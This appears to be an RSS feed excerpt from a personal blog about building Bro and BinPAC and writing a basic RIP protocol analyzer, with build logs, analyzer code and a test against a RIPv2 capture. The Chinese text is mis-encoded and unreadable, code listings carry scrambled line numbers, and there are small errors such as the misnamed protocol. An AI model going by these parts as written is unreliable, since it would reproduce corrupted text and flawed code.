23:06:58.416478 IP 10.0.0.2.520 &amp;gt; 224.0.0.9.520: RIPv2, Response, length: 84
23:07:19.709681 IP 10.0.0.1.520 &amp;gt; 224.0.0.9.520: RIPv2, Response, length: 84
23:07:24.974047 IP 10.0.0.2.520 &amp;gt; 224.0.0.9.520: RIPv2, Response, length: 84
23:07:45.389720 IP 10.0.0.1.520 &amp;gt; 224.0.0.9.520: RIPv2, Response, length: 84
23:07:53.891896 IP 10.0.0.2.520 &amp;gt; 224.0.0.9.520: RIPv2, Response, length: 84
23:08:14.625084 IP 10.0.0.1.520 &amp;gt; 224.0.0.9.520: RIPv2, Response, length: 84
23:08:21.933550 IP 10.0.0.2.520 &amp;gt; 224.0.0.9.520: RIPv2, Response, length: 84
23:08:41.410659 IP 10.0.0.1.520 &amp;gt; 224.0.0.9.520: RIPv2, Response, length: 84
23:08:47.731064 IP 10.0.0.2.520 &amp;gt; 224.0.0.9.520: RIPv2, Response, length: 84
&lt;/code>&lt;/pre>
&lt;h4 id="add-some-print-information">Add some print information&lt;/h4>
&lt;pre>&lt;code class="language-cpp"> 12 refine flow RIP_Flow += {
11 function proc_rip_message(msg: RIP_PDU): bool
10 %{
9 // Check for RIP commands
8 if ( ${msg.command} == RIP_REQUEST) {
7 printf(&amp;quot;In rip_request\n&amp;quot;);
6 BifEvent::generate_rip_request(connection()-&amp;gt;bro_analyzer(), connection()-&amp;gt;bro_analyzer()-&amp;gt;Conn(),
5 ${msg.command},
4 ${msg.version});
3 return true;
2 }
1 if ( ${msg.command} == RIP_RESPONSE) {
15 printf(&amp;quot;In rip_response\n&amp;quot;);
1 BifEvent::generate_rip_response(connection()-&amp;gt;bro_analyzer(), connection()-&amp;gt;bro_analyzer()-&amp;gt;Conn(),
2 ${msg.command},
3 ${msg.version});
4 return true;
5 }
6 %}
&lt;/code>&lt;/pre>
&lt;p>After change, &lt;code>make&lt;/code> the code again.&lt;/p>
&lt;pre>&lt;code class="language-bash">Guoze@node-0:~/00_Workbench/bro$ sudo make
make -C build all
make[1]: Entering directory '/users/Guoze/00_Workbench/bro/build'
make[2]: Entering directory '/users/Guoze/00_Workbench/bro/build'
make[3]: Entering directory '/users/Guoze/00_Workbench/bro/build'
make[3]: Leaving directory '/users/Guoze/00_Workbench/bro/build'
........
........
[100%] Built target rst
make[2]: Leaving directory '/users/Guoze/00_Workbench/bro/build'
make[1]: Leaving directory '/users/Guoze/00_Workbench/bro/build'
&lt;/code>&lt;/pre>
&lt;h4 id="use-network-capture-data-for-testing">Use Network Capture Data for Testing&lt;/h4>
&lt;pre>&lt;code class="language-bash">Guoze@node-0:~/00_Workbench$ bro -r RIPv2.cap
In rip_response
In rip_response
In rip_response
In rip_response
In rip_response
In rip_response
In rip_response
In rip_response
In rip_response
In rip_response
In rip_response
In rip_response
&lt;/code>&lt;/pre></description></item><item><title>Ubuntu 16.04å®è£broåBinpac</title><link>http://www.guozet.me/post/Install-bro-Binpac/</link><pubDate>Thu, 24 May 2018 13:30:32 +0000</pubDate><guid>http://www.guozet.me/post/Install-bro-Binpac/</guid><description>&lt;h1 id="åè¨">åè¨&lt;/h1>
&lt;p>ï»¿Bro is a powerful network analysis framework that is much different from the typical IDS you may know.&lt;/p>
&lt;p>BinPAC is a high level language for describing protocol parsers and generates C++ code. It is currently maintained and distributed with the Bro Network Security Monitor distribution, however, the generated parsers may be used with other programs besides Bro.&lt;/p>
&lt;h1 id="è½¯ä»¶å®è£">è½¯ä»¶å®è£&lt;/h1>
&lt;h2 id="å®è£bro">å®è£Bro&lt;/h2>
&lt;h3 id="åæä¾èµåå®è£">åæä¾èµåå®è£&lt;/h3>
&lt;p>Bro requires the following libraries and tools to be installed before you begin:&lt;/p>
&lt;blockquote>
&lt;ul>
&lt;li>Libpcap (
&lt;a href="http://www.tcpdump.org/" target="_blank" rel="noopener">http://www.tcpdump.org&lt;/a>)&lt;/li>
&lt;li>OpenSSL libraries (
&lt;a href="http://www.openssl.org/" target="_blank" rel="noopener">http://www.openssl.org&lt;/a>)&lt;/li>
&lt;li>BIND8 library&lt;/li>
&lt;li>Libz&lt;/li>
&lt;li>Bash (for BroControl)&lt;/li>
&lt;li>Python 2.6 or greater (for BroControl)&lt;/li>
&lt;/ul>
&lt;/blockquote>
&lt;p>To build Bro from source, the following additional dependencies are required:&lt;/p>
&lt;blockquote>
&lt;ul>
&lt;li>CMake 2.8 or greater (
&lt;a href="http://www.cmake.org/" target="_blank" rel="noopener">http://www.cmake.org&lt;/a>)&lt;/li>
&lt;li>Make&lt;/li>
&lt;li>C/C++ compiler with C++11 support (GCC 4.8+ or Clang 3.3+)&lt;/li>
&lt;li>SWIG (
&lt;a href="http://www.swig.org/" target="_blank" rel="noopener">http://www.swig.org&lt;/a>)&lt;/li>
&lt;li>Bison (GNU Parser Generator)&lt;/li>
&lt;li>Flex (Fast Lexical Analyzer)&lt;/li>
&lt;li>Libpcap headers (
&lt;a href="http://www.tcpdump.org/" target="_blank" rel="noopener">http://www.tcpdump.org&lt;/a>)&lt;/li>
&lt;li>OpenSSL headers (
&lt;a href="http://www.openssl.org/" target="_blank" rel="noopener">http://www.openssl.org&lt;/a>)&lt;/li>
&lt;li>zlib headers&lt;/li>
&lt;li>Python&lt;/li>
&lt;/ul>
&lt;/blockquote>
&lt;p>To install the required dependencies, you can use:&lt;/p>
&lt;ul>
&lt;li>DEB/Debian-based Linux:&lt;/li>
&lt;/ul>
&lt;pre>&lt;code class="language-bash">sudo apt-get install cmake make gcc g++ flex bison libpcap-dev libssl-dev python-dev swig zlib1g-dev
&lt;/code>&lt;/pre>
&lt;h3 id="installing-from-source">Installing from Source&lt;/h3>
&lt;p>Bro releases are bundled into source packages for convenience and are available on the
&lt;a href="https://www.bro.org/download/index.html" target="_blank" rel="noopener">bro downloads page&lt;/a>.&lt;/p>
&lt;p>Alternatively, the latest Bro development version can be obtained through git repositories hosted at &lt;code>git.bro.org&lt;/code>. See their
&lt;a href="https://www.bro.org/development/howtos/process.html" target="_blank" rel="noopener">git development documentation&lt;/a>.&lt;/p>
&lt;pre>&lt;code class="language-sh">git clone --recursive git://git.bro.org/bro
cd bro
sudo su
./configure
make
make install
&lt;/code>&lt;/pre>
&lt;h3 id="éç½®ç¯å¢åé">éç½®ç¯å¢åé&lt;/h3>
&lt;p>&lt;code>export PATH=/usr/local/bro/bin:$PATH&lt;/code>&lt;/p>
&lt;blockquote>
&lt;p>æ³¨æï¼ç±äºExportçæ¹å¼ï¼åªæ¯å¨æ¬æ¬¡ç»å½shçè¿ç¨ä¸­æææçï¼æä»¥åç»­éè¦éæ°éç½®&lt;/p>
&lt;/blockquote>
&lt;h2 id="å®è£binpac">å®è£Binpac&lt;/h2>
&lt;h2 id="ä¾èµåæä»¶httpswwwbroorgsphinx-gitcomponentsbinpacreadmehtmlid7">
&lt;a href="https://www.bro.org/sphinx-git/components/binpac/README.html#id7" target="_blank" rel="noopener">ä¾èµåæä»¶&lt;/a>&lt;/h2>
&lt;p>BinPAC relies on the following libraries and tools, which need to be installed before you begin:&lt;/p>
&lt;blockquote>
&lt;ul>
&lt;li>
&lt;p>Flex (Fast Lexical Analyzer)
Flex is already installed on most systems, so with luck you can skip having to install it yourself.&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Bison (GNU Parser Generator)&lt;/p>
&lt;p>Bison is also already installed on many system.&lt;/p>
&lt;/li>
&lt;li>
&lt;p>CMake 2.6.3 or greater&lt;/p>
&lt;p>CMake is a cross-platform, open-source build system, typically not installed by default. See
&lt;a href="http://www.cmake.org/" target="_blank" rel="noopener">http://www.cmake.org&lt;/a> for more information regarding CMake and the installation steps below for how to use it to build this distribution. CMake generates native Makefiles that depend on GNU Make by default&lt;/p>
&lt;/li>
&lt;/ul>
&lt;/blockquote>
&lt;h3 id="installing-from-source-1">Installing from Source&lt;/h3>
&lt;p>To build and install into &lt;code>/usr/local&lt;/code>:&lt;/p>
&lt;pre>&lt;code>git clone --recursive git@github.com:bro/binpac.git
cd binpac
./configure
cd build
make
sudo make install
&lt;/code>&lt;/pre>
&lt;p>This will perform an out-of-source build into the build directory using the default build options and then install the binpac binary into &lt;code>/usr/local/bin&lt;/code>.&lt;/p>
&lt;p>You can specify a different installation directory with:&lt;/p>
&lt;p>./configure &amp;ndash;prefix=&lt;dir>&lt;/p>
&lt;p>Run &lt;code>./configure --help&lt;/code> for more options.&lt;/p>
&lt;h2 id="ä¸è½½-binpac-sample-analyzer">ä¸è½½ BinPAC Sample Analyzer&lt;/h2>
&lt;p>è¿ä¸ªæ¯ä¸ä¸ªpythonèæ¬ï¼è½å¤æç§broçè§åçæåºBinpacéè¦ä¹¦åçæä»¶ï¼çæåºæ¥ä¹åï¼æä»¬åªéè¦å¡«åè¿äºæä»¶å°±å¯ä»¥äºã&lt;/p>
&lt;h2 id="installing-from-source-2">Installing from Source&lt;/h2>
&lt;p>ä»Githubä¸é¢æ·è´ä¾å­çæä»¶ä¸æ¥
&lt;code>git clone https://github.com/grigorescu/binpac_quickstart&lt;/code>
Inside the binpac_quickstart directory, simply run:&lt;/p>
&lt;p>&lt;code>python start.py Sample &amp;quot;Sample Protocol&amp;quot; ../bro --tcp --buffered&lt;/code>&lt;/p>
&lt;p>This will generate all the necessary files for this sample analyzer. The ../bro argument here just points to the Bro source tree. Make sure to change it if yours lives in a different location. See the start.py âhelpoptions for more explanation of the options.&lt;/p>
&lt;p>Bro should be able to compile the generated template code right away, but files may have some âTODOâ comments in them to mark places that typically need to be changed depending on the specifics of the protocol analyzer you want to make.&lt;/p>
&lt;h1 id="éå°çé®é¢">éå°çé®é¢&lt;/h1>
&lt;h2 id="ä¹¦åanalyzeræ¶åéå°çé®é¢">ä¹¦åAnalyzeræ¶åéå°çé®é¢&lt;/h2>
&lt;h3 id="broå®è£è¿ç¨ä¸­éå°çéè¯¯">Broå®è£è¿ç¨ä¸­éå°çéè¯¯&lt;/h3>
&lt;h4 id="éè¯¯1-configureéè¯¯">éè¯¯1 ./configureéè¯¯&lt;/h4>
&lt;pre>&lt;code>bro# ./configure --with-pcap=/opt/pfring
Build Directory : build
Source Directory: /root/install/bro
CMake Error at CMakeLists.txt:7 (include):
include could not find load file:
cmake/CommonCMakeConfig.cmake
CMake Error at CMakeLists.txt:52 (include):
include could not find load file:
FindRequiredPackage
â Found sed: /bin/sed
CMake Error at CMakeLists.txt:64 (FindRequiredPackage):
Unknown CMake command &amp;quot;FindRequiredPackage&amp;quot;.
â Configuring incomplete, errors occurred!
See also &amp;quot;/root/install/bro/build/CMakeFiles/CMakeOutput.log&amp;quot;.
&lt;/code>&lt;/pre>
&lt;p>è§£å³æ¹æ¡ï¼
åéçæ¶åéè¦æ·»å &amp;ndash;recursiveåæ°ï¼ä¿è¯èªå·±ä¸è½½çå­æ¨¡å
&lt;code>git clone --recursive git://git.bro.org/bro&lt;/code>&lt;/p>
&lt;h3 id="ç¼è¯èªå·±ä¹¦åçanalyzeræ¶åçé®é¢">ç¼è¯èªå·±ä¹¦åçAnalyzeræ¶åçé®é¢&lt;/h3>
&lt;h4 id="éè¯¯1">éè¯¯1&lt;/h4>
&lt;pre>&lt;code> make[3]: Entering directory '/users/Guoze/00_Workbench/bro/build'
make[3]: *** No rule to make target '../src/binpac', needed by 'src/binpac-lib_pac.h'. Stop.
make[3]: Leaving directory '/users/Guoze/00_Workbench/bro/build'
CMakeFiles/Makefile2:946: recipe for target 'src/CMakeFiles/pac-binpac-lib.pac.dir/all' failed
make[2]: *** [src/CMakeFiles/pac-binpac-lib.pac.dir/all] Error 2
make[2]: Leaving directory '/users/Guoze/00_Workbench/bro/build'
Makefile:138: recipe for target 'all' failed
make[1]: *** [all] Error 2
make[1]: Leaving directory '/users/Guoze/00_Workbench/bro/build'
Makefile:15: recipe for target 'all' failed
make: *** [all] Error 2
&lt;/code>&lt;/pre>
&lt;p>è§£å³æ¹æ¡ï¼
è¿ä¸ªéè¯¯å¾å¤§å¯è½æ§æ¯ä½ ä½¿ç¨äºå¨è¯¥æä»¶ç®å½ä¸æ²¡ææéï¼å å¥sudo make&lt;/p>
&lt;h4 id="éè¯¯2">éè¯¯2&lt;/h4>
&lt;pre>&lt;code>[ 1%] Completed 'project_caf'
make[3]: Leaving directory '/users/Guoze/00_Workbench/bro/build'
[ 2%] Built target project_caf
make[2]: Leaving directory '/users/Guoze/00_Workbench/bro/build'
Makefile:138: recipe for target 'all' failed
make[1]: *** [all] Error 2
make[1]: Leaving directory '/users/Guoze/00_Workbench/bro/build'
Makefile:15: recipe for target 'all' failed
make: *** [all] Error 2
&lt;/code>&lt;/pre>
&lt;p>è§£å³æ¹æ¡ï¼
è¿ä¸ªéè¯¯å¾å¤§å¯è½æ§æ¯ä½ ä½¿ç¨äº&lt;code>make -j 4&lt;/code>å¤æ ¸ç¼è¯çæ¹å¼å¯¼è´çï¼åæ¶å¤æ ¸ç¼è¯ï¼ä»ä»ä½¿ç¨make&lt;/p></description></item><item><title>å¨Broä¸­å®æç¬¬ä¸ä¸ªåè®®åæå¨âRIPåè®®</title><link>http://www.guozet.me/post/Write-first-Analyzer-rip/</link><pubDate>Wed, 23 May 2018 20:30:32 +0000</pubDate><guid>http://www.guozet.me/post/Write-first-Analyzer-rip/</guid><description>&lt;h1 id="åè¨">åè¨&lt;/h1>
&lt;p>çæä»£ç ç»ææå¥½çæ¹å¼ï¼å°±æ¯å°è¯èªå·±å»åä¸ä¸ªæ¨¡åå å¥å°æ´ä¸ªç³»ç»ä¸­ï¼å¨è°è¯ä»£ç çè¿ç¨ä¸­ï¼çæä»£ç ã&lt;/p>
&lt;h1 id="å®ç°æµç¨">å®ç°æµç¨&lt;/h1>
&lt;h2 id="ä½¿ç¨binpac-quick-startèæ¬çæèªå·±çanalyzerç®å½ç»æ">ä½¿ç¨Binpac quick startèæ¬çæèªå·±çAnalyzerç®å½ç»æ&lt;/h2>
&lt;h4 id="ä¸è½½binpac-quick-startèæ¬">ä¸è½½Binpac Quick Startèæ¬&lt;/h4>
&lt;p>&lt;code>git clone https://github.com/grigorescu/binpac_quickstart.git&lt;/code>
ä¸è½½å®æä¹åï¼è¿å¥è¯¥ç®å½ï¼ç®å½ç»æå¦ä¸å¾æç¤º:&lt;/p>
&lt;pre>&lt;code class="language-bash">Guoze@node-0:~/00_Workbench$ cd binpac_quickstart/
Guoze@node-0:~/00_Workbench/binpac_quickstart$ ls -al
total 32
drwxr-xr-x 4 Guoze senfv-PG0 4096 May 22 19:30 .
drwxr-xr-x 11 Guoze senfv-PG0 4096 May 23 12:15 ..
drwxr-xr-x 8 Guoze senfv-PG0 4096 May 22 19:30 .git
-rw-r--r-- 1 Guoze senfv-PG0 21 May 22 19:30 __init__.py
-rw-r--r-- 1 Guoze senfv-PG0 128 May 22 19:30 README.md
-rwxr-xr-x 1 Guoze senfv-PG0 7151 May 22 19:30 start.py
drwxr-xr-x 2 Guoze senfv-PG0 4096 May 22 19:30 templates
&lt;/code>&lt;/pre>
&lt;h4 id="ä½¿ç¨èæ¬çäº§åæå¨ç®å½ç»æ">ä½¿ç¨èæ¬çäº§åæå¨ç®å½ç»æ&lt;/h4>
&lt;p>start.pyçpythonå°±æ¯æä»¬å¯ä»¥ç¨æ¥çæbroä¸­Analyzerçpythonèæ¬ï¼ä½¿ç¨æ¹å¼ï¼&lt;/p>
&lt;pre>&lt;code class="language-bash">Guoze@node-0:~/00_Workbench/binpac_quickstart$ ./start.py
Usage:
start.py NAME DESCRIPTION PATH_TO_BRO_SRC (--tcp|--udp) [--buffered] [--plugin]
&lt;/code>&lt;/pre>
&lt;blockquote>
&lt;p>Example: &lt;code>./start.py RIP &amp;quot;Routing Internet Protocl&amp;quot; ../bro --udp&lt;/code>
åè®®åç§°ï¼RIPï¼
åè®®ä»ç»ï¼Routing Internet Protocl
Broæºä»£ç çè·¯å¾ï¼../bro
åºå±çç½ç»åè®®ï¼&amp;ndash;udp&lt;/p>
&lt;/blockquote>
&lt;p>æä»¬ä¹¦åçç¬¬ä¸ä¸ªèæ¬å°±æ¯å®ç°RIPåè®®çè§£æï¼RIPåè®®çè¯¦ç»åå®¹è¯·åèã
å¨ç»ç«¯è¾å¥ï¼&lt;code>./start.py RIP &amp;quot;Routing Internet Protocl&amp;quot; ../bro --udp&lt;/code>
æ§è¡ç»æä¹ååå«å¨broæºä»£ç ä¸ä¸¤ä¸ªä½ç½®çäº§æä»¶ï¼&lt;/p>
&lt;ol>
&lt;li>&lt;code>bro/scripts/base/protocols/rip/&lt;/code>&lt;/li>
&lt;/ol>
&lt;pre>&lt;code class="language-bash">Guoze@node-0:~/00_Workbench/bro/scripts/base/protocols/rip$ ls -l
total 12
-rw-r--r-- 1 Guoze senfv-PG0 245 May 23 12:49 dpd.sig
-rw-r--r-- 1 Guoze senfv-PG0 66 May 23 12:49 __load__.bro
-rw-r--r-- 1 Guoze senfv-PG0 1327 May 23 12:49 main.bro
&lt;/code>&lt;/pre>
&lt;blockquote>
&lt;p>&lt;strong>load&lt;/strong>.bro: This allows all the contents of the directory to be loaded via @load base/protocols/sip.
dpd.sig: This file contains a signature that can be used to attach the analyzer to connections if their content matches.
main.bro: Contains the base script-layer functionality for processing events emitted from the analyzer.&lt;/p>
&lt;/blockquote>
&lt;ol>
&lt;li>&lt;code>src/analyzer/protocol/sip/&lt;/code>&lt;/li>
&lt;/ol>
&lt;pre>&lt;code class="language-bash">Guoze@node-0:~/00_Workbench/bro/src/analyzer/protocol/rip$ ls -l
total 32
-rw-r--r-- 1 Guoze senfv-PG0 301 May 23 12:50 CMakeLists.txt
-rw-r--r-- 1 Guoze senfv-PG0 472 May 23 12:50 events.bif
-rw-r--r-- 1 Guoze senfv-PG0 480 May 23 12:50 Plugin.cc
-rw-r--r-- 1 Guoze senfv-PG0 738 May 23 15:27 rip-analyzer.pac
-rw-r--r-- 1 Guoze senfv-PG0 721 May 23 12:50 RIP.cc
-rw-r--r-- 1 Guoze senfv-PG0 715 May 23 12:50 RIP.h
-rw-r--r-- 1 Guoze senfv-PG0 1005 May 23 12:50 rip.pac
-rw-r--r-- 1 Guoze senfv-PG0 939 May 23 15:03 rip-protocol.pac
&lt;/code>&lt;/pre>
&lt;blockquote>
&lt;p>CMakeLists.txt: Informs the CMake build system how to compile the analyzer.
Plugin.cc: Analyzers in Bro are a type of plugin. This file does whatâs necessary to register the new analyzer plugin with Bro.
RIP.h: Defines the API for the new analyzer which derives from one of Broâs already-existing analyzer classes.
RIP.cc: mplementation of the analyzer. Itâs mostly just responsible for handing off data to the protocol parser thatâs been generated by BinPAC.
events.bif: Defines events that the analyzer will generate.
rip.pac: The main entry point for the BinPAC definition of the protocol that you want to parse.
rip-protocol.pac: Where the message format is defined.&lt;br>
rip-analyzer.pac: Defines a connection, flow, and other processing functions for the analyzer.&lt;/p>
&lt;/blockquote>
&lt;p>å¨è¿äºæä»¶å½ä¸­ï¼æä»¬ä¸»è¦éè¦å®æï¼&lt;/p>
&lt;ul>
&lt;li>events.bif&lt;/li>
&lt;li>rip.pac&lt;/li>
&lt;li>rip-protocol.pac&lt;/li>
&lt;li>rip-analyzer.pac&lt;/li>
&lt;/ul>
&lt;h2 id="ä»£ç å®ç°">ä»£ç å®ç°&lt;/h2>
&lt;h3 id="rip-protocolpacæä»¶">rip-protocol.pacæä»¶&lt;/h3>
&lt;p>è¿ä¸ªæä»¶å®ç°çæ¯å¯¹RIPåè®®çç»æé¨åè¿è¡å®ä¹ï¼ä»¥typeçæ¹å¼å®ä¹åè®®æ°æ®ä¼ è¾çåä¸ªé¨åãå¶ä¸­&lt;code>RIP_PDU&lt;/code>å½æ°æ¯å°éè¦å¤ççé¨åä¼ éå°åæä»ªå»ã&lt;/p>
&lt;pre>&lt;code class="language-cpp">1 # Generated by binpac_quickstart
2 # ## TODO: Add your protocol structures in here.
3 # ## some examples:
4
5 # Types are your basic building blocks.
6 # There are some builtins, or you can define your own.
7 # Here's a definition for a regular expression:
8 # type RIP_WHITESPACE = RE/[ \t]*/;
9
10 # A record is a collection of types.
11 # Here's one with the built-in types
12
13 enum Rip_Command {
14 RIP_REQUEST = 1,
15 RIP_RESPONSE = 2,
16 }
17
18 enum Rip_Version {
19 RIP_V1 = 1,
20 RIP_V2 = 2,
21 }
22
23 type Rip_Message = record {
24 command : uint8;
25 version : uint8;
26 pad : padding[2];
27 entry : Rip_Entry[] &amp;amp;until($input.length()) == 0;
28 };
29
30 type Rip_Entry = record {
31 af : uint16;
32 rt : uint16;
33 ip : uint32;
34 mask : uint32;
35 gateway : uint32;
36 metric : uint32;
37 };
38
39 type RIP_PDU(is_orig: bool) = record {
40 command : uint8;
41 version : uint8;
42 pad : padding[2];
43 } &amp;amp;byteorder=bigendian;
&lt;/code>&lt;/pre>
&lt;h3 id="rip_analyzerpacæä»¶å®ç°">rip_analyzer.pacæä»¶å®ç°&lt;/h3>
&lt;p>è¯¥æä»¶ä¸»è¦å®æå¯¹å½ä»¤ååºå¯¹&lt;code>RIP_PDU&lt;/code>å½æ°ä¼ éè¿æ¥çæ°æ®è¿è¡å¤çè§£æ, å¦ææRIPæ°æ®ååºç°é£ä¹å°±è¿å¥è¿ä¸ªå¤çæµç¨ã&lt;/p>
&lt;pre>&lt;code class="language-cpp">1 # Generated by binpac_quickstart
1
2 refine flow RIP_Flow += {
3 function proc_rip_message(msg: RIP_PDU): bool
4 %{
5 // Check for RIP commands
6 if ( ${msg.command} == RIP_REQUEST) {
7 BifEvent::generate_rip_request(connection()-&amp;gt;bro_analyzer(), connection()-&amp;gt;bro_analyzer()-&amp;gt;Conn(),
8 ${msg.command},
9 ${msg.version});
10 return true;
11 }
12 if ( ${msg.command} == RIP_RESPONSE) {
13 BifEvent::generate_rip_response(connection()-&amp;gt;bro_analyzer(), connection()-&amp;gt;bro_analyzer()-&amp;gt;Conn(),
14 ${msg.command},
15 ${msg.version});
16 return true;
17 }
18 %}
19 };
20
21 refine typeattr RIP_PDU += &amp;amp;let {
22 proc: bool = $context.flow.proc_rip_message(this);
23 };
~
&lt;/code>&lt;/pre>
&lt;h3 id="eventsbifæä»¶å®ç°">events.bifæä»¶å®ç°&lt;/h3>
&lt;pre>&lt;code class="language-cpp">1 # Generated by binpac_quickstart
1
2 # In this file, you'll define the events that your analyzer will
3 # generate. A sample event is included.
4
5 # ## TODO: Edit the sample event, and add more events.
6
7 ## Generated for RIP connections
8 ##
9 ## See `Google &amp;lt;http://lmgtfy.com/?q=RIP&amp;gt;`__ for more information about RIP
10 ##
11 ## c: The connection
12 ##
13 event rip_request%(c: connection, command: count, version: count%);
14 Event rip_response%(c: connection, command: count, version: count%);
&lt;/code>&lt;/pre>
&lt;h2 id="æµè¯">æµè¯&lt;/h2>
&lt;h3 id="éç½®broçå·¥ä½ç¯å¢">éç½®broçå·¥ä½ç¯å¢&lt;/h3>
&lt;p>é¦åéè¦éç½®å¥½broçå¯æ§è¡æä»¶çè·¯å¾é®é¢ï¼
Broå¯æ§è¡æä»¶çè·¯å¾å¨ï¼&lt;code>bro/build/src/bro&lt;/code>&lt;/p>
&lt;pre>&lt;code class="language-bash">Guoze@node-0:~/00_Workbench/bro$ ./build/src/bro -h
bro version 2.5-598
usage: ./build/src/bro [options] [file ...]
&amp;lt;file&amp;gt; | policy file, or read stdin
-a|--parse-only | exit immediately after parsing scripts
-b|--bare-mode | don't load scripts from the base/ directory
-d|--debug-policy | activate policy file debugging
-e|--exec &amp;lt;bro code&amp;gt; | augment loaded policies by given code
-f|--filter &amp;lt;filter&amp;gt; | tcpdump filter
&lt;/code>&lt;/pre>
&lt;p>Broå·²ç»æä¾äºå¯æ§è¡èæ¬ç»ä½ ï¼è®©ä½ å¯ä»¥æ¹ä¾¿çéç½®ç¯å¢åéï¼æä»¥æä»¬å¯ä»¥ç´æ¥æ§è¡éç½®èæ¬å°±å¥½äºã
éç½®ç¯å¢åéçshellèæ¬ä¸ºï¼&lt;/p>
&lt;pre>&lt;code class="language-bash">Guoze@node-0:~/00_Workbench/bro/build$ cat bro-path-dev.sh
export BROPATH=`/users/Guoze/00_Workbench/bro/build/bro-path-dev`
export BRO_PLUGIN_PATH=&amp;quot;/users/Guoze/00_Workbench/bro/build/src&amp;quot;:
export PATH=&amp;quot;/users/Guoze/00_Workbench/bro/build/src&amp;quot;:$PATH
&lt;/code>&lt;/pre>
&lt;p>æ§è¡èæ¬å®æéç½®&lt;/p>
&lt;pre>&lt;code class="language-bash">Guoze@node-0:~/00_Workbench/bro$ source ./build/bro-path-dev.sh
&lt;/code>&lt;/pre>
&lt;p>æ£æµèæ¬æ§è¡æåµï¼å¤æ­æ¯å¦å®æéç½®ï¼å¨ç»ç«¯è¾å¥ï¼&lt;code>bro -h&lt;/code>, å¦ææ§è¡ç»æåæ§è¡&lt;code>./build/src/bro -h&lt;/code>çç»æä¸è´ï¼é£ä¹å°±è¡¨ç¤ºå·²ç»éç½®æåäºã&lt;/p>
&lt;pre>&lt;code class="language-bash">Guoze@node-0:~/00_Workbench/bro$ bro -h
bro version 2.5-598
usage: bro [options] [file ...]
&amp;lt;file&amp;gt; | policy file, or read stdin
-a|--parse-only | exit immediately after parsing scripts
-b|--bare-mode | don't load scripts from the base/ directory
-d|--debug-policy | activate policy file debugging
-e|--exec &amp;lt;bro code&amp;gt; | augment loaded policies by given code
-f|--filter &amp;lt;filter&amp;gt; | tcpdump filter
-g|--dump-config | dump current config into .state dir
-h|--help|-? | command line help
&lt;/code>&lt;/pre>
&lt;h3 id="æµè¯ä»£ç ">æµè¯ä»£ç &lt;/h3>
&lt;h4 id="ä¸è½½ripçç½ç»æ°æ®æå">ä¸è½½RIPçç½ç»æ°æ®æå&lt;/h4>
&lt;p>ç´æ¥ä¸è½½ä¸ä¸ªRIPv2çæ°æ®åå°±å¯ä»¥ç¨äºæµè¯äº
&lt;code>$ wget http://packetlife.net/captures/RIPv2.cap&lt;/code>
å¤æ­æ°æ®åæ¯å¦æ¯åå«çRIPæ°æ®ï¼è½å¦ç¬¦åæä»¬çè¦æ±ï¼&lt;/p>
&lt;pre>&lt;code class="language-bash">Guoze@node-0:~/00_Workbench$ tcpdump -nr RIPv2.cap
reading from file RIPv2.cap, link-type EN10MB (Ethernet)
23:06:26.942558 IP 10.0.0.1.520 &amp;gt; 224.0.0.9.520: RIPv2, Response, length: 84
23:06:30.158769 IP 10.0.0.2.520 &amp;gt; 224.0.0.9.520: RIPv2, Response, length: 84
23:06:52.663855 IP 10.0.0.1.520 &amp;gt; 224.0.0.9.520: RIPv2, Response, length: 84
23:06:58.416478 IP 10.0.0.2.520 &amp;gt; 224.0.0.9.520: RIPv2, Response, length: 84
23:07:19.709681 IP 10.0.0.1.520 &amp;gt; 224.0.0.9.520: RIPv2, Response, length: 84
23:07:24.974047 IP 10.0.0.2.520 &amp;gt; 224.0.0.9.520: RIPv2, Response, length: 84
23:07:45.389720 IP 10.0.0.1.520 &amp;gt; 224.0.0.9.520: RIPv2, Response, length: 84
23:07:53.891896 IP 10.0.0.2.520 &amp;gt; 224.0.0.9.520: RIPv2, Response, length: 84
23:08:14.625084 IP 10.0.0.1.520 &amp;gt; 224.0.0.9.520: RIPv2, Response, length: 84
23:08:21.933550 IP 10.0.0.2.520 &amp;gt; 224.0.0.9.520: RIPv2, Response, length: 84
23:08:41.410659 IP 10.0.0.1.520 &amp;gt; 224.0.0.9.520: RIPv2, Response, length: 84
23:08:47.731064 IP 10.0.0.2.520 &amp;gt; 224.0.0.9.520: RIPv2, Response, length: 84
&lt;/code>&lt;/pre>
&lt;h4 id="ä¿®æ¹ä»£ç å å¥æµè¯æå°æ°æ®">ä¿®æ¹ä»£ç ï¼å å¥æµè¯æå°æ°æ®&lt;/h4>
&lt;pre>&lt;code class="language-cpp"> 12 refine flow RIP_Flow += {
11 function proc_rip_message(msg: RIP_PDU): bool
10 %{
9 // Check for RIP commands
8 if ( ${msg.command} == RIP_REQUEST) {
7 printf(&amp;quot;In rip_request\n&amp;quot;);
6 BifEvent::generate_rip_request(connection()-&amp;gt;bro_analyzer(), connection()-&amp;gt;bro_analyzer()-&amp;gt;Conn(),
5 ${msg.command},
4 ${msg.version});
3 return true;
2 }
1 if ( ${msg.command} == RIP_RESPONSE) {
15 printf(&amp;quot;In rip_response\n&amp;quot;);
1 BifEvent::generate_rip_response(connection()-&amp;gt;bro_analyzer(), connection()-&amp;gt;bro_analyzer()-&amp;gt;Conn(),
2 ${msg.command},
3 ${msg.version});
4 return true;
5 }
6 %}
&lt;/code>&lt;/pre>
&lt;p>ä¿®æ¹ä»£ç å®æä¹åï¼éæ°ç¼è¯ä»£ç :&lt;/p>
&lt;pre>&lt;code class="language-bash">Guoze@node-0:~/00_Workbench/bro$ sudo make
make -C build all
make[1]: Entering directory '/users/Guoze/00_Workbench/bro/build'
make[2]: Entering directory '/users/Guoze/00_Workbench/bro/build'
make[3]: Entering directory '/users/Guoze/00_Workbench/bro/build'
make[3]: Leaving directory '/users/Guoze/00_Workbench/bro/build'
........
........
[100%] Built target rst
make[2]: Leaving directory '/users/Guoze/00_Workbench/bro/build'
make[1]: Leaving directory '/users/Guoze/00_Workbench/bro/build'
&lt;/code>&lt;/pre>
&lt;p>ç»å°¾åæä¸è¿°ç»æç±»ä¼¼çè¯ï¼è¡¨ç¤ºç¼è¯éè¿ã&lt;/p>
&lt;h4 id="ä½¿ç¨ç½ç»æåæ°æ®è¿è¡æµè¯">ä½¿ç¨ç½ç»æåæ°æ®è¿è¡æµè¯&lt;/h4>
&lt;p>ä½¿ç¨Broå¯¼å¥è¿ä¸ªæ°æ®åè¿è¡æµè¯&lt;/p>
&lt;pre>&lt;code class="language-bash">Guoze@node-0:~/00_Workbench$ bro -r RIPv2.cap
In rip_response
In rip_response
In rip_response
In rip_response
